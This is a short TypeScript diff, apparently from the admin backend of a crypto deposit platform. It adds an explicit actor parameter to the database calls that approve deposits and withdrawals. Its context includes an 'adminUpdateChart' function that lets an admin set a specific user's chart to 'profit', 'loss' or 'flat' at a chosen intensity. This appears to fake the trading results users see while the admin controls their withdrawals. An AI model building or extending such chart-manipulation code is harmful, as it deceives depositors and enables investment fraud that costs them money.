@@ -168,7 +168,8 @@ export async function adminGetOverview(userId: string) {
 export async function adminDecideDeposit(userId: string, id: string, status: AdminStatus) {
   await assertOwner(userId);
 
-  const rpc = await (supabaseAdmin as any).rpc("admin_decide_deposit_atomic", { _deposit_id: id, _status: status });
+  // Pass the actor explicitly so the DB-side admin check can evaluate the real caller
+  const rpc = await (supabaseAdmin as any).rpc("admin_decide_deposit_atomic", { _deposit_id: id, _status: status, _actor: userId });
   if (!rpc.error) return { ok: true };
 
   const { data: deposit, error: fetchError } = await supabaseAdmin.from("deposits").select("*").eq("id", id).maybeSingle();
@@ -210,7 +211,8 @@ export async function adminDecideDeposit(userId: string, id: string, status: Adm
 export async function adminDecideWithdrawal(userId: string, id: string, status: AdminStatus) {
   await assertOwner(userId);
   const feeWallet = await getSetting("deposit_wallet_usdt_bep20");
-  const rpc = await (supabaseAdmin as any).rpc("admin_decide_withdrawal_atomic", { _withdrawal_id: id, _status: status, _fee_wallet: feeWallet });
+  // Pass actor so DB admin checks evaluate correctly when invoked via service-role client
+  const rpc = await (supabaseAdmin as any).rpc("admin_decide_withdrawal_atomic", { _withdrawal_id: id, _status: status, _fee_wallet: feeWallet, _actor: userId });
   if (!rpc.error) return { ok: true };
 
   const { data: withdrawal, error: fetchError } = await supabaseAdmin.from("withdrawals").select("*").eq("id", id).maybeSingle();
@@ -254,7 +256,7 @@ export async function adminDecideWithdrawal(userId: string, id: string, status: 
 
 export async function adminUpdateChart(userId: string, targetUserId: string, mode: "profit" | "loss" | "flat" | "live", intensity: number) {
   await assertOwner(userId);
-  const { error } = await supabaseAdmin.from("profiles").update({ chart_mode: mode, chart_intensity: intensity, chart_seed: Math.floor(Math.random() * 10000), updated_at: new Date().toISOString() }).eq("id", targetUserId);
+  const { error } = await supabaseAdmin.from("profiles").update({ chart_mode: mode, chart_intensity: intensity, chart_seed: Math.floor(Math.random() * 10000), updated_at: new Date().toISOString() } as never).eq("id", targetUserId);
   if (error) throw new Error(error.message);
   await writeActivity(targetUserId, "chart_control", 0, `Admin set chart to ${mode.toUpperCase()} intensity ${intensity}`, "completed");
   return { ok: true };
